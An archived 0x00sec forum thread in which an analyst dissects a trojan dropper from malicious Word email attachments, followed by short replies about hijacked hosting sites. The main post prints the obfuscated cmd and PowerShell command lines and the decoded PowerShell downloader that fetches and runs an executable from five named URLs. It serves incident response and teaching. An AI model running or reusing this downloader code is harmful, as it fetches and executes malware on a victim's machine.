<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/? - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Hello all, Nestor10 here to share a couple things Iâ€™ve learned in my day job as an infosec samurai. If you want to know some vague things about me, you can check out my introduction. 
So a few months ago, I noticed some &amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="6223.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="OwSrjDGHwZCRKwPjw2CZk38K0"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="OwSrjDGHwZCRKwPjw2CZk38K0"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?&#39;" href="6223.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223" />
<meta property="og:title" content="Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?" />
<meta name="twitter:title" content="Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?" />
<meta property="og:description" content="Hello all, Nestor10 here to share a couple things Iâ€™ve learned in my day job as an infosec samurai. If you want to know some vague things about me, you can check out my introduction.  So a few months ago, I noticed some emails coming in with really sketchy attachments - a few dozen had been delivered before I noticed, so I needed to quickly figure out what the attachments did!  DISCLAIMER This breakdown uses a real trojan drop script from late last year. While Iâ€™m fairly sure none of the URLs in..." />
<meta name="twitter:description" content="Hello all, Nestor10 here to share a couple things Iâ€™ve learned in my day job as an infosec samurai. If you want to know some vague things about me, you can check out my introduction.  So a few months ago, I noticed some emails coming in with really sketchy attachments - a few dozen had been delivered before I noticed, so I needed to quickly figure out what the attachments did!  DISCLAIMER This breakdown uses a real trojan drop script from late last year. While Iâ€™m fairly sure none of the URLs in..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="reverseengineering" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="17 â¤" />
<meta property="article:published_time" content="2018-04-08T21:59:03+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="6223.html">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/reverseengineering.html' class='discourse-tag' rel="tag">reverseengineering</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?'>
      <link itemprop='url' href='6223.html'>
      <meta itemprop='datePublished' content='2018-04-08T21:59:03Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='reverseengineering'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Nestor10.html'><span itemprop='name'>Nestor10</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="6223.html">


              <span class="crawler-post-infos">
                  <time  datetime='2018-04-08T21:59:03Z' class='post-time'>
                    April 8, 2018,  9:59pm
                  </time>
                  <meta itemprop='dateModified' content='2018-04-08T21:59:03Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hello all, Nestor10 here to share a couple things Iâ€™ve learned in my day job as an infosec samurai. If you want to know some vague things about me, you can <a href="../../../external.html?link=https://0x00sec.org/t/introduction-nestor10/6196">check out my introduction</a>.</p>
<p>So a few months ago, I noticed some emails coming in with really sketchy attachments - a few dozen had been delivered before I noticed, so I needed to quickly figure out what the attachments did!</p>
<h3>DISCLAIMER</h3>
<p>This breakdown uses a real trojan drop script from late last year. While Iâ€™m fairly sure none of the URLs in the script are still hosting any malicious code, you should proceed with the utmost caution. Do not attempt to actually run any portion of the code shown below. If you disregard this warning, you do so at your own risk, and I will not be helping you clean your system of whatever infection you end up with.</p>
<p>I dumped a sample in my trusty sandbox and got to work (you can use reverse.it or <a href="../../../external.html?link=http://malwr.com/" rel="nofollow noopener">malwr.com</a> to do the same). I get some interesting stuff back from dynamic analysis:</p>
<pre><code>WINWORD.EXE /n "C:\Wire transfer info.doc" /o "u" (PID: 464)

cmd.exe "cmd /v /c "set %WPIWCBNzG%=RBnUjZTzm&amp;&amp;set %IPmmCqufN%=p^o^w^e^r^s&amp;&amp;set %PWKdRtDdJ%=mYnZmpJdh&amp;&amp;set %XZnNiozwI%=he^l^l&amp;&amp;set %ARXbYFCDI%=zwmAfmaLS&amp;&amp;!%IPmmCqufN%!!%XZnNiozwI%! ^-^e LgAoACgAVgBhAFIAaQBBAGIATABlACAAJwAqAG0AZAByACoAJwApAC4AbgBhAE0ARQBbADMALAAxADEALAAyAF0ALQBqAE8ASQBOACcAJwApACAAKAAiACAAJAAoAHMAZQBUAC0AaQB0AGUAbQAgACAAJw [lots of this removed for space] AAgAGYATwBSAEUAYQBDAEgAIAB7ACAAKABbAEkATgBUAF0AIAAkAF8AIAAtAGEAcwBbAEMASABhAHIAXQApAH0AKQAgACsAIgAkACgAUwBlAHQALQB2AGEAUgBpAEEAYgBMAGUAIAAnAG8AZgBTACcAIAAgACcAIAAnACkAIgApACAA (PID: 1304) 
</code></pre>
<p>Well thatâ€™s obviously not doing anything good, but what is it doing? Further down the process tree we get something a little less obscure:</p>
<pre><code>powershell.exe powershell -e [wall of base64 removed] (PID: 912, Additional Context:  .((VaRiAbLe '*mdr*').naME[3,11,2]-jOIN'') (" $(seT-item 'VARIable:OFS' '') " +[STrING]( (36, 119,115, 99,114, 105,112 ,116 ,32 , 61 , 32 ,110 ,101 ,119 ,45,111 , 98,106,101,99,116 , 32,45, 67 , 111 ,109 , 79,98, 106,101, 99 ,116 , 32 , 87 , 83 ,99, 114 ,105 , 112,116, 46 , 83 , 104,101 ,108, 108,59 , 36,119 ,101 ,98 ,99 ,108,105, 101, 110, 116 ,32,61 , 32 , 110 ,101 , 119 ,45,111 ,98, 106,101 , 99,116, 32 , 83,121,115,116, 101, 109,46 , 78, 101,116 , 46 , 87,101,98, 67, 108 , 105 , 101 , 110 ,116 ,59 ,36 , 114 ,97 ,110, 100 ,111 ,109 , 32,61,32, 110, 101,119 , 45 , 111, 98, 106,101, 99 , 116 , 32 ,114,97 , 110 , 100,111,109,59 ,36 ,117 , 114 , 108, 115 ,32 , 61 , 32 ,39,104, 116,116,112, 58 ,47,47 , 108 ,117, 110 ,122,101, 114, 46,100, 101,47 , 76,83 ,106 , 108 , 74,81 ,100, 47, 44 , 104,116 , 116 ,112, 58 ,47 ,47,97 ,117,114, 103,101 , 108, 109 , 105 , 114,46,100,101 ,47 ,66,114, 77,103 ,47,44, 104,116,116 ,112,58,47, 47,112 ,117,105,107, 112 , 114,111 ,100, 117,107, 116 , 105 ,101 ,115, 46, 110 , 108 , 47,82 ,77 , 97, 117 ,87 ,71, 103 , 69, 47 ,44, 104, 116, 116,112,58 ,47,47, 98 ,114,111,99, 107, 101 ,45 , 108 , 111, 101 ,104, 114, 46 , 100, 101 ,47 ,109, 107,70 ,82 ,70, 72,70, 47,44 , 104 , 116 , 116,112,58 ,47,47 ,98 , 106 ,104,46, 100, 101 ,47 , 115 ,85 ,107 , 117,47,39 ,46 , 83 ,112 , 108,105 ,116 , 40 , 39, 44,39,41 , 59 ,36 ,110 , 97, 109, 101, 32,61 , 32, 36 ,114 ,97 , 110,100, 111 , 109,46,110 ,101, 120 , 116 , 40,49 , 44 ,32 ,54, 53 ,53, 51, 54,41, 59,36,112, 97 ,116 , 104 , 32 , 61 ,32, 36,101, 110, 118 , 58 ,116,101 , 109 , 112, 32 , 43,32 , 39,92 , 39,32,43 ,32, 36, 110 ,97,109,101 ,32 , 43,32 , 39 ,46,101, 120,101 ,39, 59 , 102 , 111,114 ,101,97 , 99 , 104 ,40 ,36 , 117 , 114 , 108 ,32,105 ,110, 32,36 , 117,114, 108 , 115 , 41,123 , 116,114 , 121,123 ,36 , 119, 101 , 98 , 99,108 ,105 ,101 , 110,116 , 46 ,68,111 ,119, 110 , 108, 111,97 ,100,70,105,108 , 101, 40 , 36 ,117 ,114 ,108, 46, 84,111,83 ,116,114, 105, 110 , 103 , 40, 41,44 , 32 , 36,112 , 97 ,116,104 , 41 ,59, 83 ,116 ,97,114 ,116 ,45 ,80, 114 ,111, 99,101 , 115 ,115 , 32 ,36,112 ,97,116 ,104,59 ,98, 114 , 101 , 97, 107, 59, 125 ,99, 97,116, 99 ,104,123, 119 ,114 ,105,116 , 101 , 45,104 , 111 , 115 ,116 , 32 ,36,95 ,46,69, 120, 99 ,101,112,116,105 ,111, 110 , 46 ,77, 101 ,115 , 115 ,97 ,103,101 ,59, 125,125) | fOREaCH { ([INT] $_ -as[CHar])}) +"$(Set-vaRiAbLe 'ofS' ' ')");)
    35087.exe (PID: 1608)
        35087.exe (PID: 2368)
</code></pre>
<p>So it looks like weâ€™ve called Powershell and then spawned some binaries from thatâ€¦ but weâ€™re still no closer to understanding how to respond to this threat being on our network.</p>
<p>Looking at the code, we can tell that there are some strings being joined in weird ways, thereâ€™s some implicit evaluation going on with parentheses, and then weâ€™ve got a whole tone of char codes, all being piped to foreach which is converting them to chars. So just like the original wall of base64 stuff that was run on cmd.exe, this should basically be creating a string to eval somehow.</p>
<p>Hereâ€™s where things get hairy - itâ€™s not easy to figure out what string this will produce without eval()ing it ourselves. That means we have to figure out a way to remove its fangs before we proceed. Letâ€™s take a look at the first bit of code:</p>
<pre><code>.((VaRiAbLe '*mdr*').naME[3,11,2]-jOIN'')
</code></pre>
<p>Nothing too dangerous there. What happens if we run it?</p>
<pre><code>cmdlet Invoke-Expression at command pipeline position 1
</code></pre>
<p>Aha! We found the claws, now we can just run the rest of the script. Hereâ€™s the secret it divulges to us:</p>
<pre><code>$wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = 'http://lunzer.de/LSjlJQd/,http://aurgelmir.de/BrMg/,http://puikprodukties.nl/RMauWGgE/,http://brocke-loehr.de/mkFRFHF/,http://bjh.de/sUku/'.Split(',');$name = $random.next(1, 65536);$path = $env:temp + '\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}}
</code></pre>
<p>When I ran the dynamic analysis, it gave me 1 IP to look intoâ€¦ but now that weâ€™ve pulled apart the code, itâ€™s clear that I need to be looking for any traffic to any URL in the $urls string there.</p>
<p>Thanks to our l33t h@x0r skilz, the affected users have been dismissed out the nearest airlock and we can block all the future traffic. Hurray!</p>
<p>Thanks for reading this cringe-worthy, sad excuse for a writeup. Itâ€™s my first time putting something like this together for a larger audience than the suits at work, so any feedback you might have will be appreciated immensely by myself. Same goes for any questions. <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Until next time,<br>
Nestor0x0000000A</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="10" />
              <span class='post-likes'>10 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/fxbg.html'><span itemprop='name'>fxbg</span></a>
                (fxbg)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-04-09T05:09:47Z' class='post-time'>
                    April 9, 2018,  5:09am
                  </time>
                  <meta itemprop='dateModified' content='2018-04-09T05:09:47Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I remember when Trojans only affected Windowsâ€¦ oh wait, this one too, darn, thought we turned a corner!</p>
<p>Also, about the <a href="../../../external.html?link=http://lunzer.de/" rel="nofollow noopener">http://lunzer.de/</a> link, I wonder if the trojan author was stupid enough to use his personal website for this or if this domain is fronted/hijacked?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Nestor10.html'><span itemprop='name'>Nestor10</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-04-12T22:13:10Z' class='post-time'>
                    April 12, 2018, 10:13pm
                  </time>
                  <meta itemprop='dateModified' content='2018-04-12T22:13:10Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Most likely hijacked - a vast majority of the things I end up temp blocking on my network are personal sites, blogs, etc. Lots of WordPress sites.</p>
<p>The file downloaded from that site would most likely be a stage 2 dropper that would then deliver the actual malware (sometimes from an actual C2).</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Solinus.html'><span itemprop='name'>Solinus</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-04-13T02:02:17Z' class='post-time'>
                    April 13, 2018,  2:02am
                  </time>
                  <meta itemprop='dateModified' content='2018-04-13T02:02:17Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Not a bad write up at all. Can learn something from anything if you take the time to do so. Nice post</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Nestor10.html'><span itemprop='name'>Nestor10</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-04-13T18:23:48Z' class='post-time'>
                    April 13, 2018,  6:23pm
                  </time>
                  <meta itemprop='dateModified' content='2018-04-13T18:23:48Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Please donâ€™t flag Suser - he posted this because Iâ€™d made a joke on the IRC channel. <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/ricksanchez.html'><span itemprop='name'>ricksanchez</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-04-13T18:32:18Z' class='post-time'>
                    April 13, 2018,  6:32pm
                  </time>
                  <meta itemprop='dateModified' content='2018-04-13T18:32:18Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>suser was being suser.  No worries <a class="mention" href="../../u/nestor10-2.html">@Nestor10</a> it was just flagged/hidden because it was no helpful for this thread and the potential discussions about it <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
